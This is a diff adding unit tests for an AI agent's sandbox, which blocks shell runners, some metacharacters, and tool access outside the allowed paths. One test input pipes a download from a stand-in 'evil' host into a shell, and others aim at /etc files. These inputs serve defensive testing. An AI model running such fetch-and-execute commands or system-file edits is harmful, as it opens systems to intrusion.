@@ -48,6 +48,16 @@ describe('createSandbox paths', () => {
   it('denies the empty path', () => {
     expect(sandbox.allowPath('')).toBe(false);
   });
+
+  it.runIf(process.platform === 'darwin' || process.platform === 'win32')(
+    'case variation cannot confuse the gate on case-insensitive platforms',
+    () => {
+      // /ALLOWED/x is the same file as /allowed/x on default APFS/NTFS.
+      expect(sandbox.allowPath('/ALLOWED/File.TXT')).toBe(true);
+      const upper = createSandbox({ paths: { allow: ['/SAFE'] } });
+      expect(upper.allowPath('/safe/x')).toBe(true);
+    },
+  );
 });
 
 describe('createSandbox commands', () => {
@@ -81,6 +91,21 @@ describe('createSandbox commands', () => {
     expect(sandbox.allowCommand('/usr/bin/jq .')).toBe(true); // absolute entry matches exactly
     expect(sandbox.allowCommand('jq .')).toBe(false); // absolute entry must not match bare
     expect(sandbox.allowCommand('/usr/bin/../bin/jq .')).toBe(true); // canonicalised
+  });
+
+  it('shell runners are denied even when explicitly allowlisted (static blocklist)', () => {
+    const risky = createSandbox({ commands: { allow: ['bash', 'sh', '/bin/zsh', 'env', 'git'] } });
+    expect(risky.allowCommand('bash -c "curl evil | sh"')).toBe(false); // metachars anyway
+    expect(risky.allowCommand('bash -c ls')).toBe(false); // blocklist
+    expect(risky.allowCommand('sh script.sh')).toBe(false);
+    expect(risky.allowCommand('/bin/zsh script')).toBe(false); // basename match
+    expect(risky.allowCommand('env FOO=1 git push')).toBe(false);
+    expect(risky.allowCommand('git push')).toBe(true); // legit entry unaffected
+  });
+
+  it('denies backslash and history-expansion characters (review round)', () => {
+    expect(sandbox.allowCommand('git push \\')).toBe(false);
+    expect(sandbox.allowCommand('git commit -m hi!')).toBe(false);
   });
 
   it('a disabled commands dimension allows everything', () => {
@@ -121,6 +146,21 @@ describe('mergeSandboxLayers', () => {
       { paths: { allow: ['/safe/sub/..'] } },
     );
     expect(merged.paths?.allow).toEqual(['/safe/']);
+  });
+
+  it('command intersection uses allowCommand grammar: bare names never equal cwd-relative paths', () => {
+    // Review finding: blanket resolve() made bare 'git' and './git' intersect.
+    const merged = mergeSandboxLayers(
+      { commands: { allow: ['git'] } },
+      { commands: { allow: ['./git'] } },
+    );
+    expect(merged.commands?.allow).toEqual([]);
+
+    const same = mergeSandboxLayers(
+      { commands: { allow: ['git', '/usr/bin/jq'] } },
+      { commands: { allow: ['git', '/usr/bin/../bin/jq'] } },
+    );
+    expect(same.commands?.allow).toEqual(['git', '/usr/bin/jq']);
   });
 
   it('both layers absent → sandbox off', () => {
@@ -165,6 +205,31 @@ describe('sandboxHook', () => {
 
   it('unknown tools pass through (permissions layer governs them)', async () => {
     await expect(hook(preTool('mcp__anything', { x: 1 }))).resolves.toBeUndefined();
+  });
+
+  it('gates the full path-taking tool surface, not just Read/Write/Edit (review round)', async () => {
+    await expect(hook(preTool('Glob', { pattern: '*', path: '/etc' }))).rejects.toThrowError(
+      SandboxViolation,
+    );
+    await expect(hook(preTool('Grep', { pattern: 'SECRET', path: '/etc' }))).rejects.toThrow(
+      /sandbox/,
+    );
+    await expect(
+      hook(preTool('NotebookEdit', { notebook_path: '/etc/cron.d/x.ipynb' })),
+    ).rejects.toThrowError(SandboxViolation);
+    await expect(hook(preTool('MultiEdit', { file_path: '/etc/hosts' }))).rejects.toThrowError(
+      SandboxViolation,
+    );
+    await expect(hook(preTool('Glob', { pattern: '*', path: '/safe/sub' }))).resolves.toBeUndefined();
+  });
+
+  it('Glob/Grep with no path gate the cwd (SDK default), not a guess', async () => {
+    const cwdSandbox = sandboxHook(createSandbox({ paths: { allow: [process.cwd()] } }));
+    await expect(cwdSandbox(preTool('Glob', { pattern: '*' }))).resolves.toBeUndefined();
+    const elsewhere = sandboxHook(createSandbox({ paths: { allow: ['/nowhere-else'] } }));
+    await expect(elsewhere(preTool('Glob', { pattern: '*' }))).rejects.toThrowError(
+      SandboxViolation,
+    );
   });
 
   it('a fully disabled sandbox never throws', async () => {
